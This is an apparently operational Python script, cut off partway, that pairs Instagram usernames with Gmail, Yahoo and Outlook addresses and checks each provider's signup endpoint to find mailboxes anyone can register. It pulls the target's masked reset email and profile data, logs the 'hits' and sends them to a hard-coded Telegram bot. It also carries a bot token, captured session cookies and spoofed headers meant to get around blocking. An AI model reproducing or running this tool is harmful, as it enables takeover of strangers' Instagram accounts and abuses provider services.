import requests
import random
import json
from user_agent import generate_user_agent
import threading
from datetime import datetime
import requests
import time
import os
import requests
from user_agent import generate_user_agent
import time

chat_id = "5122281931"
token = "5812995396:AAECr7Ryf51kOOnCV30sr6rUKesUdBux1nM"

F = '\033[2;32m'

def get_info(username,domen):
    #domen = "gmail.com"
    try:
        headers_1 = {
            'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
            'X-Pigeon-Rawclienttime': '1700251574.982',
            'X-IG-Connection-Speed': '-1kbps',
            'X-IG-Bandwidth-Speed-KBPS': '-1.000',
            'X-IG-Bandwidth-TotalBytes-B': '0',
            'X-IG-Bandwidth-TotalTime-MS': '0',
            'X-Bloks-Version-Id': '009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0',
            'X-IG-Connection-Type': 'WIFI',
            'X-IG-Capabilities': '3brTvw==',
            'X-IG-App-ID': '567067343352427',
            'User-Agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
            'Accept-Language': 'en-GB, en-US',
            'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Accept-Encoding': 'gzip, deflate',
            'Host': 'i.instagram.com',
            'X-FB-HTTP-Engine': 'Liger',
            'Connection': 'keep-alive',
            'Content-Length': '356',
        }
        data = {
            'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"0dfaf820-2748-4634-9365-c3d8c8011256","guid":"1f784431-2663-4db9-b624-86bd9ce1d084","device_id":"android-b93ddb37e983481c","query":"'+username+'"}',
            'ig_sig_key_version': '4',
        }
        response = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/', headers=headers_1, data=data)
        rest = response.json().get('email', None)
        
        headers_2 = {
            'accept': '*/*',
            'accept-language': 'en',
            'referer': f'https://www.instagram.com/{username}/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0',
            'x-ig-app-id': '936619743392459',
            'x-ig-www-claim': '0',
            'x-requested-with': 'XMLHttpRequest',
        }
        params = {'username': username}
        response = requests.get('https://www.instagram.com/api/v1/users/web_profile_info/', params=params, headers=headers_2).json()

        user_data = response.get('data', {}).get('user', {})
        id = user_data.get('id', None)
        followerNum = user_data.get('edge_followed_by', {}).get('count', None)
        followingNum = user_data.get('edge_follow', {}).get('count', None)
        postNum = user_data.get('edge_owner_to_timeline_media', {}).get('count', None)
        isPraise = user_data.get('is_private', None)
        full_name = user_data.get('full_name', None)
        biography = user_data.get('biography', None)
        
        if id:
            try:
                date = requests.get(f'https://mel7n.pythonanywhere.com/?id={id}').json().get('date', None)
            except:
                date = None
        else:
            date = None
        
        info = f'''
  - 𝗡𝗘𝗪 𝗛𝗜𝗧
  
  𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲 : {username}
  𝗡𝗮𝗺𝗲 : {full_name}
  𝗘𝗺𝗮𝗶𝗹 : {username}@{domen}
  𝗙𝗼𝗹𝗹𝗼𝘄𝗲𝗿𝘀 : {followerNum}
  𝗙𝗼𝗹𝗹𝗼𝘄𝗶𝗻𝗴 : {followingNum}
  𝗣𝗼𝘀𝘁 : {postNum}
  𝗜𝘀𝗽 : {isPraise}
  𝗗𝗮𝘁𝗲 : {date}
  𝗜𝗱 : {id}
  𝗕𝗶𝗼 : {biography}
  𝗥𝗲𝘀𝗲𝘁 : {rest}
  
  - 𝗕𝗬 : @kidMMM
        '''
        
        os.system("clear")
        print(F+info)
        with open('hits.txt', 'a') as f:
            f.write(info + '\n')
        
    except Exception as e:
        info = f'''
          - 𝗡𝗘𝗪 𝗛𝗜𝗧
          
          - 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲 : {username}
          - 𝗘𝗺𝗮𝗶𝗹 : {username}@{domen}
          
          - 𝗕𝗬 : @kidMMM
        '''
        os.system("clear")
        print(F+info)
        with open('hits.txt', 'a') as f:
            f.write(info + '\n')
    
    try:
        response = requests.get(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text={info}')
    except Exception as e:
        get_info(username,domen)

def check(username,domain):
    email = username
    url = 'https://www.instagram.com/api/v1/web/accounts/check_email/'
    head= {	
        'Host': 'www.instagram.com',
        'origin': 'https://www.instagram.com',
        'referer': 'https://www.instagram.com/accounts/signup/email/',	
        'X-Forwaded-For':'368.4.57.25.52',
        'sec-ch-ua-full-version-list': '"Android WebView";v="119.0.6045.163", "Chromium";v="119.0.6045.163", "Not?A_Brand";v="24.0.0.0"',
        'user-agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)'
    }
    data = {
        'email': email + "@" + domain,
    }
    re = requests.post(url, headers=head, data=data)
    #os.system("clear")
    
    if "email_is_taken" in re.text:
        print(f"\033[93mGood Email Taken : {username}@gmail.com\033[0m")
        if "gmail.com" in domain:
            get_info(username,"gmail.com")
        elif "yahoo.com" in domain:
            get_info(username,"yahoo.com")
        elif "yopmail.com" in domain:
            get_info(username,"yopmail.com")
        elif "hotmail.com" in domain:
            get_info(username,"hotmail.com")
        elif "outlook.com" in domain:
            get_info(username,"outlook.com")
        elif "aol.com" in domain:
            get_info(username,"aol.com")
        #reset(username)
    elif 'available":true' in re.text:
        print(f"\033[91mEmail Not Taken : {username}@gmail.com\033[0m")
    elif "please wait" in re.text:
        print(f"\033[91m========IP Blocked : {username}@gmail.com ========\033[0m")
        check(username,domain)
    else:
        pass

def check_yahoo(username):
    cookies = {
        'A3': 'd=AQABBFlDY2YCELLrh8Kmv42DA-X3TOH8pP8FEgEBAQGUZGZtZgAAAAAA_eMAAA&S=AQAAAvtOC5S8cguCrDX5JsN0NCc',
        'A1': 'd=AQABBFlDY2YCELLrh8Kmv42DA-X3TOH8pP8FEgEBAQGUZGZtZgAAAAAA_eMAAA&S=AQAAAvtOC5S8cguCrDX5JsN0NCc',
        'A1S': 'd=AQABBFlDY2YCELLrh8Kmv42DA-X3TOH8pP8FEgEBAQGUZGZtZgAAAAAA_eMAAA&S=AQAAAvtOC5S8cguCrDX5JsN0NCc',
        'GUCS': 'AU-r-Rp4',
        'AS': 'v=1&s=cUi4bGqK&d=A66bef3c2|LggCpAX.2Sq1TC6TQVsqRYpD1.D58ocesfKZ3cgEPfWiMPcU1PnqdrLryGu3vyxM_uCdsrHRWsTVAqJtZ_Vnj9AI8d4cFIaRUgOh0iYNC7M4fc0yir3K504jx_Ot0UQ3G.Fd4TJmm6NT1SqAISSLl7wPVMrxmzXdI7pg8nwhkBf7nDDirApQ4PkeTNv6ZY2SocTPdTXDJ.UArt_ERQ6GabgABAXTuQvrEuyFoaXC6KcAGPpxH8heHYxOh5DEER_tdOzhXG8mrz7hOjONeegyGOYmBdDO4pH_4_JVpmnx19UDAZmywzaFXSn5UcNMVKS_kSF2snHDiq5if.m9C7Rpx7JTpp3BeIG_PykJy2LTiN9V2SeV5bQDj0_etYKxU4F1lQvxj_gpP1OFZAl9a8IE.sU7WkRfOK1LeIHl7aztJpni4mb4tzFMZAAkSiWS6sh82Y6Ml6jAQgoUNiG8bAEQ4fSUuWpTGnH1nbupafA2IYCcke0iAiPwjyZm9ypLQP_ULfelK7_1YUf2PEOSYOBpPHngTbRgmmq9OZoPR9O2xGyD6HWYgOwCZllMzrmsaSPqiv21E5ZE3z2LWAsy6mz5w3hPx2XtFZiD9qKnL_kT247ZSBeRmPcILRLjbuJH6vOFDKL5GHNpOWNQ5e5kJApA.IP47odVqTVTD8yffR8zDPJEwdxNdja8txXuhi3DU866NYudd2eunJcbWqTHZqTzxEIStWcfEPTO8V8kx_67o2Px2nxO8qpyVmbGb6IBj5G35bhgZA4HSO39tJIL9Mx_Js8Cjr9290DF844YpUi5tQwUh_JhUzJrnpoB~A|B66bef3c5|.GnEfrL.2Trsc4niNyq7p5mtQyTAMijqBor_sHXDQULLz5SWblXZrXzj5LtdcV_EfwcjvP8gwRFVV_SZAboWLUgqeFF67sT2H1IS5eIbmZMh1zm_r0.Tu3TAvd3T2yyqBnUiT_lPYHrxL9OZ1aXdriUTEvBgmJ7a7Ihu2qoBOBec3JAaV9Zi54Dp7mPzlKwq36jOCkYELrtwCIaCQ5h42uwsmg76.vC82zhH5CuTpTU2jLfpGeUyuKJ9cToXOW8zhIR4gS56ixSe8QHUI4JhSVRPzAeIbfhB7QtuJYZUvDoSg2Ihj4McHuWLUcrRSDdwLcEVQe2_BlOkDkOGP0LTAtKL_.9giwjShXlr6CNK0J1U242sxQtRW6qcTJG3AAtAjANTLfIkXOf0ms4uuLT7Lp1v5Ngfg_5cPm1bbACg5Dn4tvt3tVq51MpuX6XqtdT14wTnLBjAdGHiLjhmGCrxBrIM7PF7qVySzCGcO.49n5OFtxo8fqdgy_Xg09h7OF3a6HYQ6nmZzmhQ7421TpMS0awoHC2Z4wQPk2FZqHuAXzUI7Gnl1CGLDjUCz_SYC8fPeIu0vzy.sFY4SE6ERdu.zvf4URoFEOBuMdjxQ.O8hb0.QoR2K9P5laz6GK6AI4g3B5IKGFi7ASWxDeNEJslx7HhWq3aRsqr.kmAJxVkdmQQIKlTgzhjjquq8ftQQBdrLq0XIsrCiisEOjzO.u1G_.qPFwcBJLVI9fOnaEO4pLf5Ijej3X_ghm84YYO9rKwO3OTelOZc8C4ryQ44f3TeKIzx2QYwTJO.9YWNMi3qXlxu1rPO9gqt8A3hl_QRrNM702vB4FTNd1FpBrt5EWyOe_6.ukmCNdzzABDsBRQeUPz0R_Pj9D_lsv3jcPR5WwIVWFfGrmSXNb0lF3NFk6hL0bPBwThNcSfphN2a0ZkLQVbSjK0YOSSHvMNjp8keJ_z17Zg0yCTk06Hzl9NPz~A',
    }

    headers = {
        'authority': 'login.yahoo.com',
        'accept': '*/*',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://login.yahoo.com',
        'referer': 'https://login.yahoo.com/account/create?lang=en-GB&src=ym&done=https%3A%2F%2Fmail.yahoo.com%2F&specId=yidregsimplified',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    params = {
        'validateField': 'userId',
    }

    data = 'browser-fp-data=%7B%22language%22%3A%22en-GB%22%2C%22colorDepth%22%3A24%2C%22deviceMemory%22%3A4%2C%22pixelRatio%22%3A3%2C%22hardwareConcurrency%22%3A8%2C%22timezoneOffset%22%3A-330%2C%22timezone%22%3A%22Asia%2FCalcutta%22%2C%22sessionStorage%22%3A1%2C%22localStorage%22%3A1%2C%22indexedDb%22%3A1%2C%22openDatabase%22%3A1%2C%22cpuClass%22%3A%22unknown%22%2C%22platform%22%3A%22Linux%20armv81%22%2C%22doNotTrack%22%3A%22unknown%22%2C%22plugins%22%3A%7B%22count%22%3A0%2C%22hash%22%3A%2224700f9f1986800ab4fcc880530dd0ed%22%7D%2C%22canvas%22%3A%22canvas%20winding%3Ayes~canvas%22%2C%22webgl%22%3A1%2C%22webglVendorAndRenderer%22%3A%22Google%20Inc.%20(Qualcomm)~ANGLE%20(Qualcomm%2C%20Adreno%20(TM)%20610%2C%20OpenGL%20ES%203.2)%22%2C%22adBlock%22%3A0%2C%22hasLiedLanguages%22%3A0%2C%22hasLiedResolution%22%3A0%2C%22hasLiedOs%22%3A0%2C%22hasLiedBrowser%22%3A0%2C%22touchSupport%22%3A%7B%22points%22%3A5%2C%22event%22%3A1%2C%22start%22%3A1%7D%2C%22fonts%22%3A%7B%22count%22%3A11%2C%22hash%22%3A%221b3c7bec80639c771f8258bd6a3bf2c6%22%7D%2C%22audio%22%3A%22124.08072766105033%22%2C%22resolution%22%3A%7B%22w%22%3A%22360%22%2C%22h%22%3A%22800%22%7D%2C%22availableResolution%22%3A%7B%22w%22%3A%22800%22%2C%22h%22%3A%22360%22%7D%2C%22ts%22%3A%7B%22serve%22%3A1723703877832%2C%22render%22%3A1723703876562%7D%7D&specId=yidregsimplified&context=REGISTRATION&cacheStored=&crumb=V2cnNQlV89gYfBcUYDtlg&acrumb=cUi4bGqK&sessionIndex=Qg--&done=https%3A%2F%2Fmail.yahoo.com%2F&googleIdToken=&authCode=&attrSetIndex=0&specData=&tos0=oath_freereg%7Cin%7Cen-IN&multiDomain=&firstName=Pruyqnshu&lastName=Sir&userid-domain=yahoo&userId='+username+'&yidDomainDefault=yahoo.com&yidDomain=yahoo.com&password=priyanshusirop562%40%40&mm=6&dd=8&yyyy=1999&signup='

    response = requests.post('https://login.yahoo.com/account/module/create?validateField=userId', params=params, cookies=cookies, headers=headers, data=data)

    if "IDENTIFIER_EXISTS" in response.text:
        print("\033[90m" + username + " : taken yahoo mail" + "\033[0m")
        #print(response.text)
    elif "IDENTIFIER_NOT_AVAILABLE" in response.text:
        print("\033[90m" + username + " : taken yahoo mail" + "\033[0m")
    else:
        #print("untaken")
        #get_info(username,"yahoo.com")
        check(username,"yahoo.com")
        #print(response.text)
        
def check_outlook(username):
    cookies = {
        'mkt': 'en-GB',
        'MicrosoftApplicationsTelemetryDeviceId': '0c3c55cb-1a7b-4144-803d-b875f8f32743',
        'MUID': '1a2370507f584736a2da4491f7440963',
        '_pxvid': '191a402e-3c7d-11ef-9510-41c4b57b7359',
        'MSFPC': 'GUID=31a31d7a8a6b4b38964ed0c45e42e6f1&HASH=31a3&LV=202407&V=4&LU=1720369343557',
        'logonLatency': 'LGN01=638592955071736500',
        'mkt1': 'en-GB',
        'amsc': 'pOhxGjbCoQb86oADtRPw5sIRmrsHY/y8MbEGpdCA2R+rT+Oop0I1nBW+CGwwIJIMp+KPG9XlPxesYpcvdAQmItS79fDBRITfOHY16ONHtijABHRFx53iRaWThrStLlHrb1G5zSb28IRzFC1blcihxEk7Ai+uzZ/YF2uw5aLCDVvll4CyicM3VhV6kpbvZsCKvZrgGavnKjOOzs0r2i6suv/Gd9KgtTnSZnrI8S6+81pOH+L1coPW6WljMMuYvgKaHgRHTaQMg+CEdW1DOmuTg0ujWE95ai5SaPINrRaqibqUfPO4hdOu4WYkdU3iMWTrRECxCpoVkbIuQOr83x3ct0xSAUh+Dzwo7f06keqE8ow=:2:3c',
        'fptctx2': 'taBcrIH61PuCVH7eNCyH0FC0izOzUpX5wN2Z%252b5egc%252f4UAJ11BFwanqKUsgX%252ffaLSbJASM79rlME6BIEepAbNvsUNqSIP%252faBRxCxQ%252fhHtfmhxPgR1qPdusOloukcNyWSDwGzulYpXP8QUNVO2ML%252btwSBHZeo8o5Bt%252fXK58mLxiAhC3iHsTilO8LwbFYCrgv07R70MIDVlMZc4QPV8q421MqyLjdj1ZnultEvY5UvgHYLRtYxIbNBu9rcaEAtP4f%252bK%252ff8a1BfnXRvz9CkwgGg7t2frpBjz%252bWyUMCE97kDJtOw7VQglIfkNnu72lzrarI4s2k96Lc7SQN5ilnTHFs6fxw%253d%253d',
        '_px3': '8d81493bdac07d713663df82d8fa7c6cd87eeb462090cbcfe7f25d2201238f2f:t6enMoytgtg9geitK0cq8swLYTfjakhtP02tZe4pPOSJDaq6CZ7Igw47iFCZgfoNwhIAAV52YjrkewN3GASMzw==:1000:HrUW1Aic+Js6w4lIRWZaK9lYu47sNnhC88OpuspwYGfFx0QT584re13GuEEzufnpfKdhikD61G6UmFp52Qqpp9FvLEs+LlY+z9S2NlEkLckUYRcskZi2a2G1IUi+AUQoNKGbgVpjjsVlvHpqs9l3Hd6xsB4e/4PvRndkApSfU/fdGE42N6KSm32OKVUULWXmPH7hBji0lqifY+ChkFtVS1Uk7UgFvKddEowRPfrg+WE=',
        '_pxde': '1c56afb21035b650375368e00473c06b468b32b88390bf7f4c4344864a9e7597:eyJ0aW1lc3RhbXAiOjE3MjM2OTg3MzMxNzMsImZfa2IiOjAsImlwY19pZCI6W119',
    }

    headers = {
        'authority': 'signup.live.com',
        'accept': 'application/json',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'canary': 'xRkysxzoMYwhex5AlPUjAAz5XFqBX0d3+gx9fGsInGApjx8xHUHsE1wJoJl+iqod/o0Be+IuFOLB3wWAjpQFUtvZX96XgMjOKse9EScnKJ4V1LhsYgMATSDTmkp96oW5Pl94LpZbl+lqDDV3icjkIAsHn1ROkxJ5UUg34bPFpGcZmAzHvQ/Bv9HECfYbr9rr6iIKPhceDOPNLkeK92wFCvbT4bzioWo8vEPzemg5YSZL6njAixeMHXv+fMkEFjbb:2:3c',
        'client-request-id': '029d509b443543c6b26780f41e2b5b24',
        'content-type': 'application/json; charset=utf-8',
        'correlationid': '029d509b443543c6b26780f41e2b5b24',
        'hpgact': '0',
        'hpgid': '200225',
        'origin': 'https://signup.live.com',
        'referer': 'https://signup.live.com/signup?sru=https%3a%2f%2flogin.live.com%2foauth20_authorize.srf%3flc%3d2057%26client_id%3d10fa57ef-4895-4ab2-872c-8c3613d4f7fb%26mkt%3dEN-GB%26opid%3dF664D7582C588F84%26opidt%3d1723698722%26uaid%3d029d509b443543c6b26780f41e2b5b24%26contextid%3dB08CB23191ADC5CD%26opignore%3d1&mkt=EN-GB&uiflavor=web&lw=1&fl=easi2&client_id=10fa57ef-4895-4ab2-872c-8c3613d4f7fb&uaid=029d509b443543c6b26780f41e2b5b24&suc=10fa57ef-4895-4ab2-872c-8c3613d4f7fb&lic=1',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    }

    json_data = {
        'includeSuggestions': True,
        'signInName': username+'@outlook.com',
        'uiflvr': 1001,
        'scid': 100118,
        'uaid': '029d509b443543c6b26780f41e2b5b24',
        'hpgid': 200225,
    }

    response = requests.post(
        'https://signup.live.com/API/CheckAvailableSigninNames?sru=https%3a%2f%2flogin.live.com%2foauth20_authorize.srf%3flc%3d2057%26client_id%3d10fa57ef-4895-4ab2-872c-8c3613d4f7fb%26mkt%3dEN-GB%26opid%3dF664D7582C588F84%26opidt%3d1723698722%26uaid%3d029d509b443543c6b26780f41e2b5b24%26contextid%3dB08CB23191ADC5CD%26opignore%3d1&mkt=EN-GB&uiflavor=web&lw=1&fl=easi2&client_id=10fa57ef-4895-4ab2-872c-8c3613d4f7fb&uaid=029d509b443543c6b26780f41e2b5b24&suc=10fa57ef-4895-4ab2-872c-8c3613d4f7fb&lic=1',
        cookies=cookies,
        headers=headers,
        json=json_data,
    )

    print(response.text)

    if 'isAvailable":true' in response.text:
        #print("untaken")
        #get_info(username,"outlook.com")
        check(username,"outlook.com")
    elif 'isAvailable":false' in response.text:
        print("\033[90m" + username + " : taken outlook mail" + "\033[0m")
    else:
        pass

def checkgmail(username):
    tim = str(time.time()).split('.')[0]
    headers = {
        'authority': 'accounts.google.com',
        'accept': '*/*',
        'accept-language': 'ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6',
        'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
        'cookie': 'HSID=A3TxC-A0yRsCA1dOO; SSID=ARenU9ksEOCIaEO4P; APISID=hnQUEqtNc5vHjhT9/AawmOWOOgkqM5vJze; ; ; ; ; ; ; ; ; __Host-GAPS=1:A5k8RauTcQc3xH2K66ARptqQB1AK0KdW5aT-RVZponPE3KiUShdpDjzVOMKscyGbCOTsVTxN6fuwkjWokE8qNLrm6MR4pg:hClD8NNycPp_GmJW; ; ; ',
        'origin': 'https://accounts.google.com',
        'referer': 'https://accounts.google.com/',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-arch': '"x86"',
        'sec-ch-ua-bitness': '"64"',
        'sec-ch-ua-full-version': '"124.0.6327.4"',
        'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-model': '""',
        'sec-ch-ua-platform': '"Linux"',
        'sec-ch-ua-platform-version': '""',
        'sec-ch-ua-wow64': '?0',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': generate_user_agent(),
        'x-chrome-connected': 'source=Chrome,eligible_for_consistency=true',
        'x-client-data': 'CLrdygE=',
        'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
        'x-goog-ext-391502476-jspb': '["S336499450:1722131730722296"]',
        'x-same-domain': '1',
    }

    par = {
        'biz': 'false',
        'continue': 'https://mail.google.com/mail/mu/mp/580/?login=1',
        'ddm': '0',
        'dsh': f'S-{tim}:1722139307145196',
        'flowEntry': 'SignUp',
        'flowName': 'GlifWebSignIn',
    }

    re = requests.get(f'https://accounts.google.com/lifecycle/flows/signup?continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fmu%2Fmp%2F580%2F%3Flogin%3D1&ddm=0&flowEntry=SignUp&flowName=GlifWebSignIn&dsh=S{tim}%3A1722152876221519', params=par, cookies=None, headers=headers)

    try:
        tok = re.text.split("3DGlifWebSignIn%26TL%3D")[2].split("','")[0]
    except:
        pass

    params = {
        'rpcids': 'E815hb',
        'source-path': '/lifecycle/steps/signup/name',
        'f.sid': '6212541759014659703',
        'bl': 'boq_identity-account-creation-evolution-ui_20240724.08_p0',
        'hl': 'ar',
        'TL': tok,
        '_reqid': '136953',
        'rt': 'c',
    }

    data = 'f.req=%5B%5B%5B%22E815hb%22%2C%22%5B%5C%22zaid%5C%22%2C%5C%22ali%5C%22%2C0%2C%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C1%2C0%2C1%2C%5C%22%5C%22%2Cnull%2Cnull%2C2%2C2%5D%2Cnull%2C%5B%5D%2C%5B%5C%22https%3A%2F%2Fmail.google.com%2Fmail%2Fmu%2Fmp%2F580%2F%3Flogin%3D1%5C%22%5D%2C1%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at=AGxDo0e6K9lFzNAdC3rGk8SRcG6K%3A1722150498848&'

    rr = requests.post(
        'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
        params=params,
        cookies=None,
        headers=headers,
        data=data,
    )
    try:
        tok = rr.text.split("3DGlifWebSignIn%26TL%3D")[2].split("','")[0]
    except:
        pass

    params = {
        'rpcids': 'eOY7Bb',
        'source-path': '/lifecycle/steps/signup/birthdaygender',
        'f.sid': '6212541759014659703',
        'bl': 'boq_identity-account-creation-evolution-ui_20240724.08_p0',
        'hl': 'ar',
        'TL': tok,
        '_reqid': '836953',
        'rt': 'c',
    }

    data = 'f.req=%5B%5B%5B%22eOY7Bb%22%2C%22%5B%5B2000%2C10%2C20%5D%2C1%2Cnull%2C0%2C%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C1%2C0%2C1%2C%5C%22%5C%22%2Cnull%2Cnull%2C2%2C2%5D%2C%5C%22%3CkV1qXQUCAAYqurJyCrqNOonCTM4ZXkP0ADQBEArZ1NP5cu3RU1Ycj4okwH-FNrHtFcz5kZBn8EpMmEWW3FnHInLGR_XrRHOVc1WHeAUtzQAAAjydAAAAHKcBB7EAQ-hrZe31BIDxYMgrnGE6oK9_vcOJJvq-P7SWhmo-kXKqaeCHPu68jHw8N9EWZEJEnNZOwduBTXmjTumyvoVLvsGsZuFWBSE6NPqtSvD4-VxfdrQMRUQi-qM3K-OlKEmlndu-g1oWwK9-DZf-d4vlqH4yeQXXjzQ_uQRJ8_9cbD_i52-ytbwhIbQjJSwblNuegt5XR_Fj5ERwy2QjQTvIPq5IXWqCAthJtLosMFENKLf7BqSk-GjX_wN9t9Yi4E4Zd4q4zI_U-KJHSNxrmVMe-09ZvzDaIUdxMyFWqDumhCdnbWB3jk_DqW-2-JTlyYzdaBv9iHtxQzK1hEjrliwgM852uuzN3R2eDoXHQR1kt0VEIt18MLbYtiCEVZfQQDl0t3w8IdmRuav7C5YjWcZ_1B4LyIrLRl0ps23K2xNCh4Yx1of8pjLaXkiMM3KtqBql9uCOj5zAnteeSaYDYXGoyL2P4AGZz56cplzO5togjyEl2Kruhv14XPN-3QKQ5pVD90oigYfo9S3lwKjrw5hOb_W-5i_0iTSKnzBbqmpHyquSrBMXaW4I6WIHCg74T06hH0eHX8JDmJu9fqUV98FurLx7CsjmFt2BgaF9q_YW-afTpws4seT7OCF-ym7IgFipEWz4XD6YdnJrM0QR-lGv9zaJjs0Prh2MoTREL0Ynyeyq4NHhAKBlQDZVUWGi7hexjCvryddX50VRV1FcdIe67rew5EJOOjSkVGBnTV0a2xvkgilEddhzJ0Ie2y_p8sTfXU4sUBb3CLvIiHCd-RbxjzjXeZLWU0LpLuFXD5zkgjQpXYX-rymsoPTi0gkpKcoUsIb2YEpOpauX24SyFPXm1Mr-3yl5OL_BoBdsCoBspMq8Rdk051GJXiP03g2i3vP6y4nIUs4nHB-0hZ9VOurDEWt6xp2fJzmvAUkgEREAoX8gQi0Q-iKJVkk6Lf76gdTxh3YbPcMBXjwjYhzbZeK-OvaEllcwwR5K1Zqmu0jPJB5-HImC55mABllihUHOzL87y8wVu-EZxS8n2O9Z4WfSgczJTI3tzUq6JUt3chFYXyYjvr7WmJZjC8LOIwRZaMALEYmEoIngQPy8guZdRXW40vVgNudUiVdfmLegNmRCUfLRWtVXouIKP0mC_-L-IW_WM_tFDSuGh3EOvuS224JcZN5fIRi0aREJYEjItygdNLQb2kAK4K-oVaF6TlK5MZn4wNWE5xaNb3dyyM83gyn5JYLxHL95voWhIaoW5_qPMs1hTQdMObhpXYCmCzyarjgrMVx05kH9Vz211x4THnsOiyIdLT_g1JM-jy2bdytPUOhHO4Q6hSnDp4xAoJ1PE2-LSm-Ee1-_dcKqFXefWt94OmDacYp1KeoJg0ofTsye4k2dj7B6UsH1m9AakITEITc6WsCGMRJCYcfBT7MI4wSn00Xa5WdCPMvRwOTA7FTWQpkmo7xnHlU1WA1PQgZX0ff5RTzogLGd8CJXfFgW8CIAO_-ovqKKtuHuZj4-YTMuvtwffnm01PppryBr886oBFaB7BNL3htjNTzltnMxalSVLSjYvhCNcqxDVgSJuPfnju6imzufHKVUvtY2Qdj4PGtUjxtjq05GaVcJXXyQ3kCd7QlXonfevIxn0aYt1kvSWdcHEZ--LLSdAeCjQWk3l7voy7GswqP-w6X_vGqUFgTD3MoaAh5_coYdVDnW9LSW7tPnpSgYGKcqmhpuNdu9zr1YpH5OjpkABmR1zBFn-clyjWoaBv_9aQ9bUlYQeBlSQWHCx6IveyEJ2jAT423lfoOefQHXdEJo2ZlSnMdeZJJ34_VwAOQvL6kgC3FosGmJ5VIX63O4RsIReQ%5C%22%2C%5Bnull%2Cnull%2C%5C%22https%3A%2F%2Fmail.google.com%2Fmail%2Fmu%2Fmp%2F580%2F%3Flogin%3D1%5C%22%5D%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at=AGxDo0e6K9lFzNAdC3rGk8SRcG6K%3A1722150498848&'

    rz = requests.post(
        'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
        params=params,
        cookies=None,
        headers=headers,
        data=data,
    )

    headers = {
        'authority': 'accounts.google.com',
        'accept': '*/*',
        'accept-language': 'ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6',
        'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
        'cookie': 'HSID=A3TxC-A0yRsCA1dOO; SSID=ARenU9ksEOCIaEO4P; APISID=hnQUEqtNc5vHjhT9/AawmOWOOgkqM5vJze; ; ; ; ; ; ; ; ; __Host-GAPS=1:A5k8RauTcQc3xH2K66ARptqQB1AK0KdW5aT-RVZponPE3KiUShdpDjzVOMKscyGbCOTsVTxN6fuwkjWokE8qNLrm6MR4pg:hClD8NNycPp_GmJW; ; ; ',
        'origin': 'https://accounts.google.com',
        'referer': 'https://accounts.google.com/',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-arch': '"x86"',
        'sec-ch-ua-bitness': '"64"',
        'sec-ch-ua-full-version': '"124.0.6327.4"',
        'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-model': '""',
        'sec-ch-ua-platform': '"Linux"',
        'sec-ch-ua-platform-version': '""',
        'sec-ch-ua-wow64': '?0',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        'x-chrome-connected': 'source=Chrome,eligible_for_consistency=true',
